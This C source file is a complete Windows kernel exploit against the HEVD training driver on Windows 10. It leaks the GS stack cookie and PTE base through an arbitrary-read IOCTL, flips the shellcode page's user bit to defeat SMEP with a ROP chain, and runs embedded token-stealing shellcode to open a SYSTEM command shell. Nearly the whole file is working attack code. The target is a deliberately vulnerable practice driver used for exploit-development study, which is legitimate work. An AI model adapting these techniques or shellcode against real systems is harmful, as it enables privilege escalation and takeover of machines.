#include "Common.h"
#include "Exploits.h"
#include "Gadgets.h"

/*
   HEVD Stack Overflow with GS / Medium Integrity

   Author: @xct_de
   Target: 10.0.19044

   SMEP Bypass via PTE U/S Flipping (using arb. read primitive), reading Stack Cookie from .Data Section & xoring with RSP, Token Stealing Bait Shellcode
   Reference: https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html
*/

int HevdStackOverflowGSMI(int argc, char** argv) {
	printf("~-------------------------------~\n");
	printf("  Running HevdStackOverflowGSMI  \n");
	printf("~-------------------------------~\n");

	ResolveGadgets();

	DWORD POP_RAX = kernelGadgets["POP_RAX"];
	DWORD POP_RCX = kernelGadgets["POP_RCX"];
	DWORD MOV_RAX_TO_PTR_RCX = kernelGadgets["MOV_RAX_PTRRCX"];
	DWORD JUST_RET = kernelGadgets["RET"];

	const char* driverPath = "C:\\HEVD\\HEVD.sys";
	const char* exploitName = "Exploit.exe";
	DWORD MiGetPteAddressOffset = 0x221ef0;
	BOOL resultIOCTL = false;

	typedef struct _ArbitraryReadBuffer
	{
		uintptr_t readAddress;
		uintptr_t outBuf;
	} ArbitraryReadBuffer;

	// TokenStealingBail Shellcode
	BYTE sc[256] = {
		0x48, 0x31, 0xc0, 0x65, 0x48, 0x8b, 0x80, 0x88, 0x01, 0x00,
		0x00, 0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x49, 0x89,
		0xc1, 0x48, 0x8b, 0x80, 0x48, 0x04, 0x00, 0x00, 0x48, 0x8b,
		0x00, 0x48, 0x8b, 0x50, 0xf8, 0x49, 0x89, 0xc0, 0x48, 0x8b,
		0x00, 0x48, 0x83, 0xfa, 0x04, 0x75, 0xf0, 0x49, 0x8b, 0x50,
		0x70, 0x48, 0x83, 0xe2, 0xf8, 0x49, 0x8b, 0x89, 0xb8, 0x04,
		0x00, 0x00, 0x48, 0x83, 0xe1, 0x07, 0x48, 0x01, 0xca, 0x49,
		0x89, 0x91, 0xb8, 0x04, 0x00, 0x00, 0x65, 0x48, 0x8b, 0x04,
		0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01,
		0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48,
		0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78,
		0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00,
		0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f,
		0x01, 0xf8, 0x48, 0x0f, 0x07, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[!] Error while creating a handle to the driver: %d\n", GetLastError());
		exit(1);
	}

	// get base address of kernel & driver (only works from medium integrity)
	QWORD ntBase = getBaseAddr(L"ntoskrnl.exe");
	printf("[>] NT base: %p\n", ntBase);
	QWORD hevdBase = getBaseAddr(L"HEVD.sys");
	printf("[>] Hevd base: %p\n", hevdBase);

	// allocate shellcode memory & copy shellcode into it
	LPVOID sc_ptr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	printf("[>] Shellcode @ %p\n", sc_ptr);
	RtlCopyMemory(sc_ptr, sc, sizeof(sc));

	// get .data section to load the stack cookie (GS)
	DWORD dataSectionOffset = getDriverDataSection(driverPath);
	ULONG_PTR dataSection = hevdBase + dataSectionOffset;
	printf("[>] Found .data section @ %p\n", dataSection);
	 
	// read stack cookie from .data section
	QWORD readBuffer = 0;
	ArbitraryReadBuffer arbReadBuf = { 0 };
	arbReadBuf.readAddress = dataSection;
	arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;

	printf("[>] Leaking stack cookie from the .data section\n");
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not read stack cookie (IOCTL failed).\n");
		return -1;
	}
	if (readBuffer == 0) {
		printf("[-] Could not read stack cookie (readBuffer == 0)\n");
	}
	QWORD stackCookie = readBuffer;
	printf("[>] Stack cookie is: 0x%llx\n", stackCookie);
	
	StackInfo stackInfo = leakStackBase(exploitName);
	printf("  Stack base 0x%llx\n", stackInfo.Base);
	printf("  Stack limit 0x%llx\n", stackInfo.Limit);

	printf("[>] Searching down from stack limit: 0x%llx\n", stackInfo.Limit);
	intptr_t stackSearch = (intptr_t)stackInfo.Limit - 0xff0;
	BOOL foundControlCode = FALSE;
	while (stackSearch < (intptr_t)stackInfo.Limit - 0x10) {
		arbReadBuf.readAddress = stackSearch;
		arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
		resultIOCTL = false;
		resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
		if (!resultIOCTL) {
			printf("[-] Could not read stack (IOCTL failed).\n");
			return -1;
		}
		if (readBuffer == 0x22200B) {
			printf("[*] Found CTL_CODE in the stack at: 0x%llx\n", stackSearch);
			foundControlCode = TRUE;
			break;
		}
		stackSearch += sizeof(intptr_t);
	}
	if (!foundControlCode) {
		printf("[-] Failed finding control code in stack\n");
		return -1;
	}
	QWORD rsp = stackSearch - 0x50 - 0x230 - 0x28; // from reversing
	printf("[>] RSP that get xored with stack cookie at BufferOverflowGS_internal should be: 0x%llx\n", rsp);
	QWORD xoredCookie = rsp ^ stackCookie;
	printf("[>] Xored cookie is: 0x%llx\n", xoredCookie);

	// Use PTE Method to Flip U/S
	uintptr_t readAddress = (uintptr_t)ntBase + MiGetPteAddressOffset + 0x13;
	arbReadBuf.readAddress = readAddress;
	arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
	printf("[>] Getting PteBase value\n");
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not get PteBase (IOCTL failed).\n");
		return -1;
	}
	if (readBuffer == 0) {
		printf("[-] Failed getting PteBase (readBuffer == 0)!\n");
		return -1;
	}
	printf("[>] Got PteBase: 0x%llx\n", readBuffer);
	QWORD pteBase = readBuffer;

	uintptr_t shellcodePte = getPteAddress(sc_ptr, (PVOID)pteBase);
	printf("[>] Shellcode at: 0x%llx\n", sc_ptr);
	printf("[>] Got PteAddress of shellcode: 0x%llx\n", shellcodePte);

	// Read the PTE data, flip the user bit and write it back
	readBuffer = 0;
	arbReadBuf.readAddress = shellcodePte;
	arbReadBuf.outBuf = (ULONG_PTR)&readBuffer;
	resultIOCTL = false;
	resultIOCTL = DeviceIoControl(hDriver, IOCTL(0x802), (LPVOID)&arbReadBuf, sizeof(arbReadBuf), NULL, 0, NULL, NULL);
	if (!resultIOCTL) {
		printf("[-] Could not get PteData (IOCTL failed).\n");
		return -1;
	}
	if (readBuffer == 0) {
		printf("[-] Failed getting PteData (readBuffer == 0)!\n");
		return -1;
	}
	printf("[>] PTE Data of shellcode: 0x%llx\n", readBuffer);
	_mm_clflush(&sc_ptr);

	// Reset the User bit to zero (supervisor mode)
	QWORD wantedPteValue = readBuffer & ~0x4;

	// rop chain to disable smep with updated PteValue
	int offset = 512;
	BYTE uBuffer[616] = { 'A' };
	*(QWORD*)(uBuffer + offset) = xoredCookie;
	*(QWORD*)(uBuffer + 568) = (QWORD) (ntBase + POP_RCX);
	*(QWORD*)(uBuffer + 576) = (QWORD) shellcodePte;
	*(QWORD*)(uBuffer + 584) = (QWORD) (ntBase + POP_RAX);
	*(QWORD*)(uBuffer + 592) = (QWORD) wantedPteValue;
	*(QWORD*)(uBuffer + 600) = (QWORD) (ntBase + MOV_RAX_TO_PTR_RCX);
	*(QWORD*)(uBuffer + 608) = (QWORD) (ntBase + JUST_RET);

	sprayTLBCache(); // sometimes required to make U/S stick

	// this will "fail" but still do what we want
	DeviceIoControl(hDriver, IOCTL(0x801), (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);
	printf("[>] Disabled SMEP\n");

	// send shellcode
    *(QWORD*)(uBuffer + 568) = (QWORD)(sc_ptr);
	DeviceIoControl(hDriver, IOCTL(0x801), (LPVOID)&uBuffer, sizeof(uBuffer), NULL, 0, NULL, NULL);
	printf("[>] Starting shell\n");
	system("cmd.exe");

	return 0;
}
